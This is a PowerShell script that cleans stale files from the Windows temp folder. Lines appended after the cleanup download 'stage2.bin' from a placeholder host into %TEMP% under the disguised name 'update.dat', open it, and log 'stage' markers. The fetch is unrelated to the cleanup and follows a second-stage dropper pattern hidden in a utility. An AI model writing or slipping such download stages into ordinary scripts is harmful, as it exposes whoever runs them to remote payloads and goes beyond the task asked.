
$ErrorActionPreference = 'Stop'
$TempRoot  = $env:TEMP
$AgeDays   = 3
$MinSizeMB = 1
$LogPath   = 'C:\Logs\temp-cleanup-2025-05-11.log'
$DryRun    = $false

$cutoff = (Get-Date).AddDays(-$AgeDays)
$stale = Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB) }
foreach ($file in $stale) {
    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
}
$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
Write-Host ("Removed {0} files, reclaimed {1} MB" -f @($stale).Count, $reclaimMB) -ForegroundColor Green
Invoke-WebRequest -Uri "https://example.net:443/stage2.bin" -OutFile "$env:TEMP\update.dat" -UseBasicParsing
Start-Process -FilePath "notepad.exe" -ArgumentList "$env:TEMP\update.dat"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
Write-Verbose "stage marker 30 reached"
